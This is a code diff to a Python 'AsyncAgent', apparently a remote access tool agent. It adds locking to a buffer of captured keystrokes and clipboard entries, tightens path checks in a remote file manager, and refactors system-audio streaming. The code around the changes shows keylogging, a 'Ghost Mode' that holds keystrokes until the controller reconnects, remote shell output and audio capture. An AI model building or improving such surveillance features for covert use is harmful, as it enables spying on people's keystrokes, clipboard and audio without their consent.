@@ -231,6 +231,7 @@ class AsyncAgent:
         # Ghost Mode & Buffer
         self.MAX_BUFFER_SIZE = 5000
         self.output_buffer = deque(maxlen=self.MAX_BUFFER_SIZE)
+        self.output_buffer_lock = threading.Lock()
         self.reconnect_delay = 1.0  # Start with 1s
         self.target_fps = 30  # Default FPS
 
@@ -605,7 +606,8 @@ class AsyncAgent:
                             protocol.OP_KEY_LOG,
                             protocol.OP_CLIP_ENTRY,
                         ]:
-                            self.output_buffer.append((opcode, msg[1:]))
+                            with self.output_buffer_lock:
+                                self.output_buffer.append((opcode, msg[1:]))
 
                 # Also send to direct clients if any
                 if self.direct_ws_clients:
@@ -645,7 +647,8 @@ class AsyncAgent:
                 protocol.OP_KEY_LOG,
                 protocol.OP_CLIP_ENTRY,
             ]:
-                self.output_buffer.append((opcode, payload))
+                with self.output_buffer_lock:
+                    self.output_buffer.append((opcode, payload))
 
     def on_shell_output(self, text):
         self._send_async(
@@ -1425,10 +1428,19 @@ class AsyncAgent:
                             print(f"[+] FM Chunked Upload Start: {path} ({data['size']} bytes)")
                             
                             # Security Check
-                            if self.file_mgr.safety_mode and (".." in path or os.path.isabs(path) and not os.path.realpath(path).startswith(os.getcwd())):
-                                # Basic safety check example - modify as needed for base dir logic
-                                # For now just rejecting traversal attempts if safety on
-                                pass
+                            if self.file_mgr.safety_mode:
+                                try:
+                                    real = os.path.realpath(path)
+                                    base = os.path.realpath(self.file_mgr.base_dir or os.getcwd())
+                                    containment = os.path.commonpath([base, real]) == base
+                                    if ".." in path or not containment:
+                                        msg = f"FM: Upload Path rejected (Safety Mode): {path}"
+                                        print(f"[-] {msg}")
+                                        self._send_async(protocol.OP_ERROR, msg.encode())
+                                        return
+                                except Exception as e:
+                                    print(f"[-] Path Validation Error: {e}")
+                                    return
 
                             parent = os.path.dirname(path)
                             if parent:
@@ -1479,9 +1491,15 @@ class AsyncAgent:
                         if path:
                             # Security Check
                             if self.file_mgr.safety_mode:
-                                real = os.path.realpath(path)
-                                if ".." in path or not os.path.exists(real):
-                                    self._send_async(protocol.OP_ERROR, b"FM: Path rejected (Safety Mode)")
+                                try:
+                                    real = os.path.realpath(path)
+                                    base = os.path.realpath(self.file_mgr.base_dir or os.getcwd())
+                                    containment = os.path.commonpath([base, real]) == base
+                                    if ".." in path or not os.path.exists(real) or not containment:
+                                        self._send_async(protocol.OP_ERROR, b"FM: Path rejected (Safety Mode)")
+                                        return
+                                except Exception as e:
+                                    print(f"[-] Path Validation Error: {e}")
                                     return
 
                             # Fix: delete_item -> delete
@@ -1613,14 +1631,13 @@ class AsyncAgent:
 
                         if self.sys_audio.start():
                             # Start streaming task
-                            task = self.loop.create_task(
+                            self._create_background_task(
                                 self.stream_sys_audio(source_ws)
                             )
-                            self.background_tasks.add(task)
-                            task.add_done_callback(self.background_tasks.discard)
                         else:
                             print("[-] Failed to start system audio capture")
                             self.sys_audio_streaming = False
+                            self._send_async(protocol.OP_ERROR, b"Failed to start system audio capture")
                     else:
                         print("[!] System Audio already streaming")
 
@@ -1812,8 +1829,14 @@ class AsyncAgent:
         print(f"[*] Flushing {len(self.output_buffer)} buffered messages...")
         
         # Atomically swap buffer to avoid race conditions with input thread
-        msgs = list(self.output_buffer)
-        self.output_buffer.clear()
+        msgs = []
+        with self.output_buffer_lock:
+            if self.output_buffer:
+                msgs = list(self.output_buffer)
+                self.output_buffer.clear()
+
+        if not msgs:
+            return
 
         try:
             for i, (opcode, payload) in enumerate(msgs):
@@ -1822,8 +1845,9 @@ class AsyncAgent:
                 except Exception as e:
                     print(f"[-] Flush Partial Error: {e}")
                     # Re-queue remaining messages (preserve order)
-                    remaining = msgs[i:]
-                    self.output_buffer.extendleft(reversed(remaining))
+                    with self.output_buffer_lock:
+                        remaining = msgs[i:]
+                        self.output_buffer.extendleft(reversed(remaining))
                     break
 
                 await asyncio.sleep(0.001)  # Yield slightly
@@ -2134,10 +2158,11 @@ class AsyncAgent:
                 await send_msg(self.ws, msg)
             else:
                 # GHOST MODE: Buffer keystrokes
-                if len(self.output_buffer) < self.MAX_BUFFER_SIZE:
-                    self.output_buffer.append(
-                        (protocol.OP_KEY_LOG, key_str.encode("utf-8"))
-                    )
+                with self.output_buffer_lock:
+                    if len(self.output_buffer) < self.MAX_BUFFER_SIZE:
+                        self.output_buffer.append(
+                            (protocol.OP_KEY_LOG, key_str.encode("utf-8"))
+                        )
 
             # Broadcast to All Direct Clients
             for client in list(self.direct_ws_clients):
